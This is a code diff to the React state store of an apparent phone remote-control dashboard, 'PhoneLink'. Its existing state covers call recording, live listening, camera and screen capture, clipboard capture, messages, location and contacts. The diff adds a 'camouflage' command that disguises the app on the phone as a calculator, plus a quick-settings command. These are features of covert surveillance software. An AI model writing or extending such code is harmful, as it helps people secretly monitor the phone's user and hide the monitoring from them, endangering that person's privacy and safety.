@@ -76,6 +76,8 @@ export function StoreProvider({ children }) {
   const [scheduledCommands, setScheduledCommands] = useState({});
   const [volumeSosConfig, setVolumeSosConfig] = useState({});
   const [callRecordingConfig, setCallRecordingConfig] = useState({});
+  const [camouflageConfig, setCamouflageConfig] = useState({});
+  const [quickSettingsStatus, setQuickSettingsStatus] = useState({});
   const ws = useRef(null);
   const alertTimers = useRef({});
   // Mirrors files.downloadBuffer for the stray-terminator guard below
@@ -838,6 +840,26 @@ function titleOrApp(appName, title, text) {
           break;
         }
 
+        case 'CAMOUFLAGE_STATUS': {
+          if (p.deviceId) {
+            setCamouflageConfig((prev) => ({ ...prev, [p.deviceId]: p }));
+            if (p.calculatorDisguise !== undefined) {
+              pushToast(p.calculatorDisguise ? '🧮 Calculator camouflage active on phone' : 'Standard PhoneLink icon active', 'info');
+            }
+          }
+          break;
+        }
+
+        case 'QUICK_SETTING_STATUS': {
+          if (p.deviceId) {
+            setQuickSettingsStatus((prev) => ({ ...prev, [p.deviceId]: p }));
+            if (p.message) {
+              pushToast(p.message, p.success !== false ? 'success' : 'info');
+            }
+          }
+          break;
+        }
+
         case 'CALL_RECORDING_SAVED': {
           pushToast(`🎙️ Call recording saved: ${p.fileName} (${((p.fileSize || 0) / 1024).toFixed(0)} KB)`, 'success');
           break;
@@ -1271,6 +1293,16 @@ function titleOrApp(appName, title, text) {
         if (!activeDeviceId) return;
         sendCommand('call-recording-config', { enabled, deviceId: activeDeviceId });
       },
+      camouflage: camouflageConfig[activeDeviceId] || null,
+      updateCamouflage: (config) => {
+        if (!activeDeviceId) return;
+        sendCommand('camouflage-config', { ...config, deviceId: activeDeviceId });
+      },
+      quickSettings: quickSettingsStatus[activeDeviceId] || null,
+      sendQuickSetting: (action, payload = {}) => {
+        if (!activeDeviceId) return;
+        sendCommand('quick-setting', { action, ...payload, deviceId: activeDeviceId });
+      },
       removeDevice: async (deviceId) => {
         try {
           const res = await fetch(`/api/devices/${deviceId}`, { method: 'DELETE' });
@@ -1292,7 +1324,7 @@ function titleOrApp(appName, title, text) {
         return false;
       }
     }),
-    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, batteryAlertConfig, autoTimelapseConfig, latestTimelapseFrame, timelapseGallery, geofenceConfig, autoReplyConfig, networkUsageData, scheduledCommands, volumeSosConfig, callRecordingConfig, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
+    [devices, activeDeviceId, currentTab, callLogsSubTab, deviceSyncConfig, parentalControlState, appUsageData, batteryAlertConfig, autoTimelapseConfig, latestTimelapseFrame, timelapseGallery, geofenceConfig, autoReplyConfig, networkUsageData, scheduledCommands, volumeSosConfig, callRecordingConfig, camouflageConfig, quickSettingsStatus, calls, messages, locations, contacts, files, notifications, connected, incomingCallAlert, smsAlert, toasts, sendCommand, dismissAlert, dismissSmsAlert, pushToast, deviceInfo, installedApps, wifiInfo, clipboardHistory, clipboardCapture, appPermissions, callBlocklist, micRecording, latestMicAudio, cameraCapturing, latestCameraPhoto, screenshotCapturing, latestScreenshot, screenRecording, latestScreenFrame, cameraStreaming, latestCameraFrame, torchOn, liveListening, latestAudioChunk, volumeInfo, batteryStats, lostModeState, galleryPhotos, galleryLoading, cellularInfo, dndStatus, strobeActive, junkScanData, isScanningJunk, motionAlarmState, walkieTalkieActive]
   );
 
   return <StoreContext.Provider value={value}>{children}</StoreContext.Provider>;
